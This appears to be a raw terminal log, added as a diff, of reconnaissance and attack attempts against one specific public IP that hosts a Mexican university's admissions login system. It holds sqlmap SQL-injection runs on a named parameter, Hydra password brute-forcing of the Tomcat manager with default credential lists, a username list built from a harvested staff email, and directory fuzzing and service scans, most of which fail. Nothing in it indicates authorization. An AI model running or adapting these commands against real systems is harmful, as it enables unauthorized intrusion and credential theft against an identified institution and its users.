@@ -1,0 +1,97 @@
+qlmap -u "http://189.254.143.102/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=1" --dbs --batch:
+
+t is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[23:52:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[23:52:39] [WARNING] GET parameter 'xCveBachillerato' does not seem to be injectable
+[23:52:39] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+[23:52:39] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 74 times
+
+hydra -L /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt -P /usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt 189.254.143.102 http-get /manager/html -V:
+
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-27 23:51:44
+
+$echo -e "hnieto\nadmin\ntomcat\nmanager\nsito\nutslp" > custom_users.txt
+bash: custom_users.txt: Permiso denegado
+
+$dirb http://189.254.143.102 /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -X .jsp,.xml,.properties -o dirb_results.txt
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+OUTPUT_FILE: dirb_results.txt
+
+(!) FATAL: Error opening output file: dirb_results.txt
+
+sqlmap -u "http://189.254.143.102/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=1" \
+--tables --exclude-sysdbs \
+--technique=BEUSTQ \
+--threads=5
+
+MSFCONSOLE
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+└──╼ $nmap -sV -p 80,443,8080,8009,8005,8443 189.254.143.102 --script=tomcat*
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-28 00:15 CST
+NSE: failed to initialize the script engine:
+/usr/bin/../share/nmap/nse_main.lua:829: 'tomcat*' did not match a category, filename, or directory
+stack traceback:
+	[C]: in function 'error'
+	/usr/bin/../share/nmap/nse_main.lua:829: in local 'get_chosen_scripts'
+	/usr/bin/../share/nmap/nse_main.lua:1364: in main chunk
+	[C]: in ?
+
+QUITTING!
+
+┌─[marcos_os@parrot]─[/usr/share/wordlists]
+└──╼ $wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt -f wfuzz_results.html --hc 404 "http://189.254.143.102/FUZZ"
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+ /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Error opening file. [Errno 13] Permission denied: 'wfuzz_results.html'
+
+└──╼ $dirb http://189.254.143.102 /usr/share/dirb/wordlists/common.txt -f -S -X .xml,.properties,.config
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sat Sep 27 23:57:46 2025
+URL_BASE: http://189.254.143.102/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+OPTION: Fine tunning of NOT_FOUND detection
+OPTION: Silent Mode
+EXTENSIONS_LIST: (.xml,.properties,.config) | (.xml)(.properties)(.config) [NUM = 3]
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://189.254.143.102/ ----
+
+(!) FATAL: Too many errors connecting to host
+    (Possible cause: RECV ERROR)
+
+-----------------
+END_TIME: Sun Sep 28 00:16:12 2025
+DOWNLOADED: 6294 - FOUND: 0
+
+wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 "http://189.254.143.102/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=FUZZ"
+
+Total time: 0
+Processed Requests: 951
+Filtered Requests: 0
+Requests/sec.: 0
+
+
+hatweb -a 3 http://189.254.143.102
+http://189.254.143.102 [302 Found] Apache, Country[MEXICO][MX], HTTPServer[Apache-Coyote/1.1], IP[189.254.143.102], RedirectLocation[https://189.254.143.102/]
+ERROR: Plugin Apache failed for https://189.254.143.102/. execution expired
+ERROR: Plugin Bootstrap failed for https://189.254.143.102/. execution expired
+https://189.254.143.102/ [200 OK] Country[MEXICO][MX], Email[hnieto@utslp.edu.mx], HTTPServer[Apache-Coyote/1.1], IP[189.254.143.102], JQuery[1.5.1,3.2.1], PasswordField[xContrasena], Script[text/javascript], Title[SITO - UTSLP]
+
+
